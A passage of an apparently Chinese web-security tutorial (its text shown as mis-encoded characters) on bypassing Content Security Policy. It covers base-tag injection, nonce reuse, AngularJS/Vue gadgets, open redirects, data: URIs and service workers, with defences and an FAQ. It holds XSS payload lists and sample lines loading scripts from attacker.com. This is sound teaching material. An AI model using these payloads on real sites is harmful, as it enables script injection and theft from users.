<span class="cm">&lt;!-- &lt;script src=&quot;/js/app.js&quot;&gt;&lt;/script&gt; --&gt;</span>

<span class="cm">&lt;!-- æ³¨å…¥ base æ ‡ç­¾ --&gt;</span>
<span class="p">&lt;</span><span class="nt">base</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;https://attacker.com/&quot;</span><span class="p">&gt;</span>

<span class="cm">&lt;!-- ç°åœ¨ /js/app.js ä¼šä» https://attacker.com/js/app.js åŠ è½½ --&gt;</span>
</code></pre>
      </div>

      <p><strong>é˜²å¾¡</strong>: è®¾ç½® <code>base-uri 'none'</code> æˆ– <code>base-uri 'self'</code></p>

      <h4 id="4-åˆ©ç”¨-nonce-é‡ç”¨">4. <strong>åˆ©ç”¨ Nonce é‡ç”¨</strong></h4>

      <p>å¦‚æœåŒä¸€ä¸ª nonce åœ¨å¤šä¸ªè„šæœ¬ä¸­é‡ç”¨ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥ä½¿ç”¨ç›¸åŒ nonce çš„è„šæœ¬ã€‚</p>

      <p><strong>æ˜“å—æ”»å‡»çš„ä»£ç </strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="cm">&lt;!-- æœåŠ¡å™¨ä½¿ç”¨å›ºå®šæˆ–å¯é¢„æµ‹çš„ nonce --&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">nonce</span><span class="o">=</span><span class="s">&quot;abc123&quot;</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;/static/app.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>

<span class="cm">&lt;!-- æ”»å‡»è€…æ³¨å…¥ --&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">nonce</span><span class="o">=</span><span class="s">&quot;abc123&quot;</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre>
      </div>

      <p><strong>é˜²å¾¡</strong>: æ¯ä¸ªè¯·æ±‚ç”Ÿæˆéšæœº nonce</p>

      <h4 id="5-åˆ©ç”¨-script-gadgets">5. <strong>åˆ©ç”¨ Script Gadgets</strong></h4>

      <p>æŸäº›æ¡†æ¶æˆ–åº“æä¾›çš„åŠŸèƒ½å¯ä»¥è¢«æ»¥ç”¨æ¥æ‰§è¡Œä»£ç ã€‚</p>

      <p><strong>ç¤ºä¾‹ï¼šAngularJS (CSP æ¨¡å¼)</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">&lt;</span><span class="nt">div</span> <span class="na">ng-app</span> <span class="na">ng-csp</span><span class="p">&gt;</span>
  {{ constructor.constructor(&#39;alert(1)&#39;)() }}
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</code></pre>
      </div>

      <p><strong>ç¤ºä¾‹ï¼šVue.js</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;app&quot;</span><span class="p">&gt;</span>
  {{ constructor.constructor(&#39;alert(1)&#39;)() }}
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://cdn.jsdelivr.net/npm/vue@2&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="ow">new</span><span class="w"> </span><span class="nx">Vue</span><span class="p">({</span><span class="w"> </span><span class="nx">el</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;#app&#39;</span><span class="w"> </span><span class="p">})&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre>
      </div>

      <h4 id="6-åˆ©ç”¨-dangling-markup">6. <strong>åˆ©ç”¨ Dangling Markup</strong></h4>

      <p>é€šè¿‡ä¸é—­åˆæ ‡ç­¾æ¥"å¸æ”¶"åç»­å†…å®¹ã€‚</p>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="cm">&lt;!-- æ³¨å…¥ç‚¹ --&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;[INJECTION]&quot;</span><span class="p">&gt;</span>

<span class="cm">&lt;!-- æ³¨å…¥å†…å®¹ --&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;&lt;base</span> <span class="na">href</span><span class="o">=</span><span class="s">&#39;https://attacker.com/&#39;</span><span class="p">&gt;</span>

<span class="cm">&lt;!-- åç»­æ‰€æœ‰ç›¸å¯¹é“¾æ¥å°†æŒ‡å‘æ”»å‡»è€…æœåŠ¡å™¨ --&gt;</span>
</code></pre>
      </div>

      <h4 id="7-åˆ©ç”¨-iframe-å’Œ-srcdoc">7. <strong>åˆ©ç”¨ iframe å’Œ srcdoc</strong></h4>

      <p><strong>æ˜“å—æ”»å‡»çš„é…ç½®</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="err">Content-Security-Policy: script-src &#39;self&#39;</span>
</code></pre>
      </div>

      <p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">srcdoc</span><span class="o">=</span><span class="s">&quot;&lt;script&gt;alert(origin)&lt;/script&gt;&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
</code></pre>
      </div>

      <p><strong>æ³¨æ„</strong>: <code>srcdoc</code> ç»§æ‰¿çˆ¶é¡µé¢çš„ CSPï¼Œä½†æŸäº›æµè§ˆå™¨å®ç°æœ‰ç¼ºé™·ã€‚</p>

      <p><strong>é˜²å¾¡</strong>: è®¾ç½® <code>frame-src</code> å’Œ <code>child-src</code></p>

      <h4 id="8-åˆ©ç”¨é‡å®šå‘">8. <strong>åˆ©ç”¨é‡å®šå‘</strong></h4>

      <p>å¦‚æœç™½åå•åŸŸåå­˜åœ¨å¼€æ”¾é‡å®šå‘æ¼æ´ï¼š</p>

      <p><strong>æ˜“å—æ”»å‡»çš„é…ç½®</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="err">Content-Security-Policy: script-src &#39;self&#39; https://trusted.com</span>
</code></pre>
      </div>

      <p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="cm">&lt;!-- trusted.com æœ‰å¼€æ”¾é‡å®šå‘ --&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://trusted.com/redirect?url=https://attacker.com/evil.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre>
      </div>

      <h4 id="9-åˆ©ç”¨-data-uri">9. <strong>åˆ©ç”¨ <code>data:</code> URI</strong></h4>

      <p><strong>æ˜“å—æ”»å‡»çš„é…ç½®</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="err">Content-Security-Policy: script-src &#39;self&#39; data:</span>
</code></pre>
      </div>

      <p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;data:text/javascript,alert(1)&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">object</span> <span class="na">data</span><span class="o">=</span><span class="s">&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">object</span><span class="p">&gt;</span>
</code></pre>
      </div>

      <p><strong>é˜²å¾¡</strong>: é¿å…åœ¨ <code>script-src</code> ä¸­ä½¿ç”¨ <code>data:</code></p>

      <h4 id="10-åˆ©ç”¨-service-worker">10. <strong>åˆ©ç”¨ Service Worker</strong></h4>

      <p>Service Worker å¯ä»¥æ‹¦æˆªå’Œä¿®æ”¹ç½‘ç»œè¯·æ±‚ã€‚</p>

      <p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ³¨å†Œæ¶æ„ Service Worker</span>
<span class="nx">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">register</span><span class="p">(</span><span class="s1">&#39;/evil-sw.js&#39;</span><span class="p">);</span>

<span class="c1">// evil-sw.js</span>
<span class="nx">self</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;fetch&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;legitimate.js&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">event</span><span class="p">.</span><span class="nx">respondWith</span><span class="p">(</span><span class="ow">new</span><span class="w"> </span><span class="nx">Response</span><span class="p">(</span><span class="s1">&#39;alert(1)&#39;</span><span class="p">));</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <p><strong>é˜²å¾¡</strong>: ä¸¥æ ¼é™åˆ¶ Service Worker çš„æ¥æº</p>

      <hr />

      <h2 id="å®æˆ˜ç¤ºä¾‹">å®æˆ˜ç¤ºä¾‹</h2>

      <h3 id="ç¤ºä¾‹1-æ£€æµ‹-csp-é…ç½®">ç¤ºä¾‹1: æ£€æµ‹ CSP é…ç½®</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æå–é¡µé¢çš„ CSP ç­–ç•¥</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">getCSP</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="c1">// æ–¹æ³•1: ä» meta æ ‡ç­¾</span>
<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">metaCSP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;meta[http-equiv=&quot;Content-Security-Policy&quot;]&#39;</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">metaCSP</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Meta CSP:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">metaCSP</span><span class="p">.</span><span class="nx">content</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// æ–¹æ³•2: é€šè¿‡è¿è§„æµ‹è¯•</span>
<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">img</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Image</span><span class="p">();</span>
<span class="w">  </span><span class="nx">img</span><span class="p">.</span><span class="nx">onerror</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Image blocked by CSP&#39;</span><span class="p">);</span>
<span class="w">  </span><span class="nx">img</span><span class="p">.</span><span class="nx">src</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;https://attacker.com/test.jpg&#39;</span><span class="p">;</span>

<span class="w">  </span><span class="c1">// æ–¹æ³•3: æŸ¥çœ‹æ§åˆ¶å°é”™è¯¯</span>
<span class="w">  </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Check console for CSP violations&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="nx">getCSP</span><span class="p">();</span>
</code></pre>
      </div>

      <h3 id="ç¤ºä¾‹2-è‡ªåŠ¨åŒ–-csp-ç»•è¿‡æµ‹è¯•">ç¤ºä¾‹2: è‡ªåŠ¨åŒ– CSP ç»•è¿‡æµ‹è¯•</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// CSP Bypass Checker</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">payloads</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
<span class="w">  </span><span class="s1">&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;</span><span class="p">,</span>
<span class="w">  </span><span class="s1">&#39;&lt;img src=x onerror=alert(1)&gt;&#39;</span><span class="p">,</span>
<span class="w">  </span><span class="s1">&#39;&lt;svg onload=alert(1)&gt;&#39;</span><span class="p">,</span>
<span class="w">  </span><span class="s1">&#39;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&#39;</span><span class="p">,</span>
<span class="w">  </span><span class="s1">&#39;&lt;base href=&quot;https://attacker.com/&quot;&gt;&#39;</span><span class="p">,</span>
<span class="w">  </span><span class="s1">&#39;&lt;link rel=&quot;import&quot; href=&quot;https://attacker.com/evil.html&quot;&gt;&#39;</span><span class="p">,</span>
<span class="w">  </span><span class="s1">&#39;&lt;object data=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&#39;</span><span class="p">,</span>
<span class="p">];</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">testCSP</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">payloads</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">payload</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="kd">const</span><span class="w"> </span><span class="nx">div</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;div&#39;</span><span class="p">);</span>
<span class="w">      </span><span class="nx">div</span><span class="p">.</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">payload</span><span class="p">;</span>
<span class="w">      </span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">div</span><span class="p">);</span>
<span class="w">      </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Payload </span><span class="si">${</span><span class="nx">i</span><span class="si">}</span><span class="sb"> injected:`</span><span class="p">,</span><span class="w"> </span><span class="nx">payload</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Payload </span><span class="si">${</span><span class="nx">i</span><span class="si">}</span><span class="sb"> blocked:`</span><span class="p">,</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">});</span>
<span class="p">}</span>

<span class="nx">testCSP</span><span class="p">();</span>
</code></pre>
      </div>

      <h3 id="ç¤ºä¾‹3-åˆ©ç”¨-angularjs-ç»•è¿‡-csp">ç¤ºä¾‹3: åˆ©ç”¨ AngularJS ç»•è¿‡ CSP</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&quot;Content-Security-Policy&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;script-src &#39;self&#39; https://ajax.googleapis.com&quot;</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="cm">&lt;!-- åŠ è½½ AngularJS --&gt;</span>
  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>

  <span class="cm">&lt;!-- CSP ç»•è¿‡ --&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">ng-app</span> <span class="na">ng-csp</span><span class="p">&gt;</span>
    {{ constructor.constructor(&#39;alert(document.domain)&#39;)() }}
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>

  <span class="cm">&lt;!-- æˆ–è€…ä½¿ç”¨ ng-focus --&gt;</span>
  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">ng-app</span> <span class="na">ng-csp</span> <span class="na">ng-focus</span><span class="o">=</span><span class="s">&quot;constructor.constructor(&#39;alert(1)&#39;)()&quot;</span> <span class="na">autofocus</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æœ€ä½³å®è·µ">æœ€ä½³å®è·µ</h2>

      <h3 id="é˜²å¾¡æ–¹">é˜²å¾¡æ–¹</h3>

      <ol>
        <li>
          <p><strong>ä½¿ç”¨ä¸¥æ ¼çš„ CSP</strong></p>

          <div class="codehilite">
            <pre><span></span><code><span class="err">Content-Security-Policy:</span>
<span class="err">  default-src &#39;none&#39;;</span>
<span class="err">  script-src &#39;nonce-RANDOM&#39; &#39;strict-dynamic&#39;;</span>
<span class="err">  object-src &#39;none&#39;;</span>
<span class="err">  base-uri &#39;none&#39;;</span>
</code></pre>
          </div>
        </li>
        <li>
          <p><strong>é¿å…ä½¿ç”¨ä¸å®‰å…¨çš„æŒ‡ä»¤</strong></p>

          <ul>
            <li>ç¦ç”¨ <code>'unsafe-inline'</code></li>
            <li>ç¦ç”¨ <code>'unsafe-eval'</code></li>
            <li>ç¦ç”¨ <code>data:</code> URIï¼ˆå¯¹äºè„šæœ¬ï¼‰</li>
          </ul>
        </li>
        <li>
          <p><strong>ä½¿ç”¨ Nonce æˆ– Hash</strong></p>

          <div class="codehilite">
            <pre><span></span><code><span class="cm">&lt;!-- æ¯æ¬¡è¯·æ±‚ç”Ÿæˆéšæœº nonce --&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">nonce</span><span class="o">=</span><span class="s">&quot;{{ random_nonce }}&quot;</span><span class="p">&gt;</span>
<span class="w">  </span><span class="c1">// å†…è”è„šæœ¬</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre>
          </div>
        </li>
        <li>
          <p><strong>é™åˆ¶ CDN ç™½åå•</strong></p>

          <ul>
            <li>ä»…å…è®¸å¿…è¦çš„ CDN</li>
            <li>ä½¿ç”¨ SRI (Subresource Integrity) éªŒè¯<br />
              <div class="codehilite"><br />
                <pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://cdn.example.com/lib.js&quot;</span><br />
<span class="na">integrity</span><span class="o">=</span><span class="s">&quot;sha384-&#8230;&quot;</span><br />
<span class="na">crossorigin</span><span class="o">=</span><span class="s">&quot;anonymous&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span><br />
</code></pre><br />
              </div>
            </li>
          </ul>
        </li>
        <li>
          <p><strong>ä½¿ç”¨ CSP æŠ¥å‘Š</strong></p>

          <div class="codehilite">
            <pre><span></span><code><span class="err">Content-Security-Policy-Report-Only:</span>
<span class="err">  default-src &#39;self&#39;;</span>
<span class="err">  report-uri /csp-report</span>
</code></pre>
          </div>
        </li>
      </ol>

      <h3 id="æ”»å‡»æ–¹æ¸—é€æµ‹è¯•">æ”»å‡»æ–¹ï¼ˆæ¸—é€æµ‹è¯•ï¼‰</h3>

      <ol>
        <li>
          <p><strong>æ”¶é›†ä¿¡æ¯</strong></p>

          <ul>
            <li>æŸ¥çœ‹ HTTP å“åº”å¤´</li>
            <li>æ£€æŸ¥ <code>&lt;meta&gt;</code> æ ‡ç­¾</li>
            <li>æŸ¥çœ‹æ§åˆ¶å° CSP è¿è§„æŠ¥å‘Š</li>
          </ul>
        </li>
        <li>
          <p><strong>è¯†åˆ«å¼±ç‚¹</strong></p>

          <ul>
            <li>æ˜¯å¦ä½¿ç”¨ <code>unsafe-inline</code> æˆ– <code>unsafe-eval</code></li>
            <li>ç™½åå•æ˜¯å¦åŒ…å«å¯åˆ©ç”¨çš„ CDN</li>
            <li>æ˜¯å¦ç¼ºå°‘ <code>base-uri</code> é™åˆ¶</li>
          </ul>
        </li>
        <li>
          <p><strong>æ„é€  Payload</strong></p>

          <ul>
            <li>æ ¹æ®å…è®¸çš„æ¥æºé€‰æ‹©æ”»å‡»å‘é‡</li>
            <li>æµ‹è¯• Script Gadgets</li>
            <li>å°è¯•åè®®çº§ç»•è¿‡</li>
          </ul>
        </li>
        <li>
          <p><strong>éªŒè¯ç»•è¿‡</strong></p>

          <ul>
            <li>åœ¨æµè§ˆå™¨ä¸­æµ‹è¯•</li>
            <li>æ£€æŸ¥æ˜¯å¦è§¦å‘ CSP è¿è§„</li>
            <li>ç¡®è®¤ä»£ç æ‰§è¡Œ</li>
          </ul>
        </li>
      </ol>

      <hr />

      <h2 id="å¸¸è§é—®é¢˜">å¸¸è§é—®é¢˜</h2>

      <h3 id="q-csp-èƒ½å®Œå…¨é˜²æ­¢-xss-å—">Q: CSP èƒ½å®Œå…¨é˜²æ­¢ XSS å—ï¼Ÿ</h3>

      <p><strong>A</strong>: ä¸èƒ½ã€‚CSP æ˜¯æ·±åº¦é˜²å¾¡çš„ä¸€å±‚ï¼Œå¯ä»¥æ˜¾è‘—å‡å°‘ XSS æ”»å‡»é¢ï¼Œä½†ï¼š</p>

      <ul>
        <li>é…ç½®ä¸å½“çš„ CSP å¯èƒ½è¢«ç»•è¿‡</li>
        <li>ä¸ä¿æŠ¤æœåŠ¡å™¨ç«¯æ¼æ´</li>
        <li>æŸäº›æµè§ˆå™¨æ”¯æŒä¸å®Œæ•´</li>
        <li>éœ€è¦é…åˆå…¶ä»–å®‰å…¨æªæ–½ï¼ˆè¾“å…¥éªŒè¯ã€è¾“å‡ºç¼–ç ç­‰ï¼‰</li>
      </ul>

      <h3 id="q-strict-dynamic-æ˜¯ä»€ä¹ˆ">Q: <code>strict-dynamic</code> æ˜¯ä»€ä¹ˆï¼Ÿ</h3>

      <p><strong>A</strong>: <code>'strict-dynamic'</code> æ˜¯ CSP Level 3 çš„ç‰¹æ€§ï¼Œå…è®¸å¸¦æœ‰æœ‰æ•ˆ nonce/hash çš„è„šæœ¬åŠ¨æ€åŠ è½½å…¶ä»–è„šæœ¬ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="err">Content-Security-Policy: script-src &#39;nonce-random&#39; &#39;strict-dynamic&#39;</span>
</code></pre>
      </div>

      <p>å¥½å¤„ï¼š</p>

      <ul>
        <li>ç®€åŒ–ç­–ç•¥ç®¡ç†</li>
        <li>è‡ªåŠ¨ä¿¡ä»»é€šè¿‡ nonce éªŒè¯çš„è„šæœ¬åŠ è½½çš„å­è„šæœ¬</li>
        <li>å‘åå…¼å®¹</li>
      </ul>

      <h3 id="q-å¦‚ä½•æµ‹è¯•æˆ‘çš„-csp-é…ç½®">Q: å¦‚ä½•æµ‹è¯•æˆ‘çš„ CSP é…ç½®ï¼Ÿ</h3>

      <p><strong>A</strong>: ä½¿ç”¨ä»¥ä¸‹å·¥å…·ï¼š</p>

      <ol>
        <li><strong>Google CSP Evaluator</strong>: https://csp-evaluator.withgoogle.com/</li>
        <li><strong>CSP Scanner</strong>: æµè§ˆå™¨æ‰©å±•</li>
        <li><strong>æ‰‹åŠ¨æµ‹è¯•</strong>: æ³¨å…¥å„ç§ XSS payload</li>
        <li><strong>Report-Only æ¨¡å¼</strong>: å…ˆè§‚å¯Ÿè€Œä¸é˜»æ­¢</li>
      </ol>

      <h3 id="q-nonce-å’Œ-hash-æœ‰ä»€ä¹ˆåŒºåˆ«">Q: Nonce å’Œ Hash æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h3>

      <p><strong>A</strong>:</p>

      <p><strong>Nonce</strong> (Number used once):</p>

      <ul>
        <li>æœåŠ¡å™¨ä¸ºæ¯ä¸ªè¯·æ±‚ç”Ÿæˆéšæœºå€¼</li>
        <li>è„šæœ¬æ ‡ç­¾å¿…é¡»åŒ…å«åŒ¹é…çš„ nonce</li>
        <li>åŠ¨æ€å†…å®¹å‹å¥½</li>
      </ul>

      <div class="codehilite">
        <pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span> <span class="na">nonce</span><span class="o">=</span><span class="s">&quot;r@nd0m&quot;</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre>
      </div>

      <p><strong>Hash</strong>:</p>

      <ul>
        <li>å¯¹è„šæœ¬å†…å®¹è®¡ç®—å“ˆå¸Œå€¼</li>
        <li>è„šæœ¬å†…å®¹å¿…é¡»ä¸å“ˆå¸Œå®Œå…¨åŒ¹é…</li>
        <li>é€‚åˆé™æ€è„šæœ¬</li>
      </ul>

      <div class="codehilite">
        <pre><span></span><code><span class="err">Content-Security-Policy: script-src &#39;sha256-hash_of_script_content&#39;</span>
</code></pre>
      </div>

      <hr />

      <h2 id="è¿›é˜¶é˜…è¯»">è¿›é˜¶é˜…è¯»</h2>

      <h3 id="å®˜æ–¹æ–‡æ¡£">å®˜æ–¹æ–‡æ¡£</h3>

      <ul>
        <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">MDN Content Security Policy</a></li>
        <li><a href="https://www.w3.org/TR/CSP3/">W3C CSP Level 3 è§„èŒƒ</a></li>
        <li><a href="https://developers.google.com/web/fundamentals/security/csp">Google Web Fundamentals - CSP</a></li>
      </ul>

      <h3 id="å®‰å…¨ç ”ç©¶">å®‰å…¨ç ”ç©¶</h3>

      <ul>
        <li><a href="https://research.google/pubs/pub45542/">CSP Is Dead, Long Live CSP!</a> - Google ç ”ç©¶</li>
        <li><a href="https://github.com/PortSwigger/csp-bypass">CSP Bypasses é›†åˆ</a></li>
        <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html">Content
            Security Policy Cheat Sheet</a> - OWASP</li>
      </ul>

      <h3 id="å·¥å…·">å·¥å…·</h3>

      <ul>
        <li><a href="https://csp-evaluator.withgoogle.com/">CSP Evaluator</a></li>
        <li><a href="https://report-uri.com/">Report URI</a> - CSP æŠ¥å‘Šæ”¶é›†</li>
        <li><a href="https://github.com/mozilla/http-observatory">CSP Scanner</a></li>
      </ul>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="../02-Techniques/xss_exploitation.md">XSS æ¼æ´åˆ©ç”¨</a></li>
        <li><a href="../01-Foundations/browser_security.md">æµè§ˆå™¨å®‰å…¨æœºåˆ¶</a></li>
        <li><a href="../01-Foundations/http_security_headers.md">HTTP å®‰å…¨å¤´éƒ¨</a></li>
        <li><a href="../02-Techniques/dom_xss_detection.md">DOM XSS æ£€æµ‹</a></li>
      </ul>

    </div>

    <div class="section" id="04-Advanced-Recipes-webrtc-fingerprinting">
      <h2>40. WebRTC Fingerprinting</h2>
      <h1 id="webrtc-æŒ‡çº¹ä¸éšç§">WebRTC æŒ‡çº¹ä¸éšç§</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>WebRTC (Web Real-Time Communication) æ˜¯ä¸€ç§æ”¯æŒç½‘é¡µæµè§ˆå™¨è¿›è¡Œå®æ—¶è¯­éŸ³ã€è§†é¢‘é€šä¿¡å’Œæ•°æ®å…±äº«çš„æŠ€æœ¯ã€‚ç„¶è€Œï¼ŒWebRTC ä¹Ÿå¯èƒ½æ³„éœ²ç”¨æˆ·çš„çœŸå® IP
        åœ°å€å’Œå…¶ä»–è®¾å¤‡ä¿¡æ¯ï¼Œæˆä¸ºæŒ‡çº¹è¯†åˆ«å’Œéšç§æ³„éœ²çš„é‡è¦é€”å¾„ã€‚</p>

      <hr />

      <h2 id="åŸºç¡€æ¦‚å¿µ">åŸºç¡€æ¦‚å¿µ</h2>

      <h3 id="å®šä¹‰">å®šä¹‰</h3>

